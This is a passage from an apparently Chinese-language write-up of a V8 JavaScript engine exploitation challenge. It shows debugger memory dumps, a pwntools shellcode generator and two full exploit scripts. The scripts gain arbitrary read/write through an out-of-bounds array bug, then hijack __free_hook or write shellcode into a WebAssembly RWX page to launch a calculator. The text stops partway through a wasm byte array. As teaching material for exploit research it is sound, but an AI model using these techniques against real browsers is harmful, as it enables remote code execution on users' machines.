wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br><span class="line">% DebugPrint(f);</span><br><span class="line">% SystemBreak();</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230627191458616.png"  alt="image-20230627191458616"></p><p>当我们运行可以看到确实是返回了42。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5faf9</span><br><span class="line">0x365390d5faf9: [Function] in OldSpace</span><br><span class="line"> - map: 0x309e6c9c4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x365390d42109 &lt;JSFunction (sfi = 0x2a087603b29)&gt;</span><br><span class="line"> - elements: 0x2754f1600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x365390d5fac1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x365390d41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x365390d5f901</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x2754f1600c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x02a0876004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x02a087600449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x02a087600369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x02a0876003d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>查看一下这个 f ，可以看到他的类型为<code>JSFunction</code>，继续跟进其中的<code>share_info</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fac1</span><br><span class="line">0x365390d5fac1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x2754f16009e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x365390d5fa99 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x2754f1600c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x2754f1602a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x2754f1601319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure><p>继续跟进data。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x365390d5fa99</span><br><span class="line">0x365390d5fa99: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x2754f1605879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x365390d5f901 &lt;Instance map = 0x309e6c9c9789&gt;</span><br><span class="line"> - function_index: 0</span><br></pre></td></tr></table></figure><p>进一步查看<code>instance</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x365390d5f901-1 20</span><br><span class="line">00:0000│  0x365390d5f900 —▸ 0x309e6c9c9789 ◂— 0x2500002754f16001</span><br><span class="line">01:0008│  0x365390d5f908 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">02:0010│  0x365390d5f910 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">03:0018│  0x365390d5f918 —▸ 0x7fc28d7f0000 ◂— 0x0</span><br><span class="line">04:0020│  0x365390d5f920 ◂— 0x10000</span><br><span class="line">05:0028│  0x365390d5f928 ◂— 0xffff</span><br><span class="line">06:0030│  0x365390d5f930 —▸ 0x55ec1cb0d818 —▸ 0x7ffd93629d90 ◂— 0x7ffd93629d90</span><br><span class="line">07:0038│  0x365390d5f938 —▸ 0x2754f1600c71 ◂— 0x2754f16008</span><br><span class="line">08:0040│  0x365390d5f940 —▸ 0x55ec1cb931e0 ◂— 0x0</span><br><span class="line">09:0048│  0x365390d5f948 —▸ 0x2754f16004d1 ◂— 0x2754f16005</span><br><span class="line">0a:0050│  0x365390d5f950 ◂— 0x0</span><br><span class="line">... ↓     3 skipped</span><br><span class="line">0e:0070│  0x365390d5f970 —▸ 0x55ec1cb93200 ◂— 0x0</span><br><span class="line">0f:0078│  0x365390d5f978 —▸ 0x2754f16004d1 ◂— 0x2754f16005</span><br><span class="line">10:0080│  0x365390d5f980 —▸ 0x55ec1cb03b50 —▸ 0x2754f1600751 ◂— 0xce00002754f16007</span><br><span class="line">11:0088│  0x365390d5f988 —▸ 0x2ed8b8773000 ◂— movabs r10, 0x2ed8b8773260 /* 0x2ed8b8773260ba49 */</span><br><span class="line">12:0090│  0x365390d5f990 —▸ 0x9e8bdb4e4a1 ◂— 0x710000309e6c9c91</span><br><span class="line">13:0098│  0x365390d5f998 —▸ 0x9e8bdb4e711 ◂— 0x710000309e6c9cad</span><br><span class="line">pwndbg&gt; vmmap 0x2ed8b8773000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x2ed8b8773000     0x2ed8b8774000 rwxp     1000 0      [anon_2ed8b8773] +0x0</span><br></pre></td></tr></table></figure><p>可以看到在偏移为<code>0x88</code>处有rwx的段了。最后直接写入shellcode即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># https://www.xi4oyu.top/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">just8</span>(<span class="params">data</span>):</span></span><br><span class="line">    size = <span class="built_in">len</span>(data)</span><br><span class="line">    real_size = size <span class="keyword">if</span> size % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> size + (<span class="number">8</span> - size % <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data.ljust(real_size, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_js</span>(<span class="params">data</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;var sc_arr = [&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i // <span class="number">8</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            ret += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        x = u64(data[i:i+<span class="number">8</span>])</span><br><span class="line">        ret += <span class="string">&#x27;\t&#x27;</span> + <span class="built_in">hex</span>(x) + <span class="string">&#x27;n,&#x27;</span></span><br><span class="line">    ret += <span class="string">&#x27;\n]\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_exec</span>(<span class="params">path, argv, envp</span>):</span></span><br><span class="line">    sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    sc += shellcraft.pushstr(path)</span><br><span class="line">    sc += shellcraft.mov(<span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rsi&#x27;</span>, argv)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rdx&#x27;</span>, envp)</span><br><span class="line">    sc += shellcraft.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sc = call_exec(<span class="string">&#x27;/usr/bin/xcalc&#x27;</span>, [<span class="string">&#x27;xcalc&#x27;</span>], [<span class="string">&#x27;DISPLAY=:0&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line">data = asm(sc)</span><br><span class="line">data = just8(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_js(data))</span><br></pre></td></tr></table></figure><p>上面这是我抄的用于生成js的shellcode的python脚本，在开头留有原作者链接。</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span>, (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = arbitrary_read(address_of(a.constructor) + <span class="number">0x30n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code_addr =&gt; 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> v8_addr = arbitrary_read(code_addr + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> v8_base = v8_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;v8_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> free_got_addr = v8_base + <span class="number">0x12aa8b8n</span>;</span><br><span class="line"><span class="keyword">var</span> free_addr = arbitrary_read(free_got_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x9a6d0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;libc_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> __free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, system_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;gnome-calculator\x00&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230627183627029.png"  alt="image-20230627183627029"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span> + (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>, <span class="number">0x62792eb848500101n</span>, <span class="number">0x431480101626d60n</span>, <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>, <span class="number">0x1010101010101b8n</span>, <span class="number">0x6d606279b8485001n</span>, <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>, <span class="number">0x313b68e6894856e6n</span>, <span class="number">0x101012434810101n</span>, <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>, <span class="number">0x894852e201485a08n</span>, <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(sc_arr.length * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">        data_view.setFloat64(i * <span class="number">8</span>, i2f(value[i]), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span 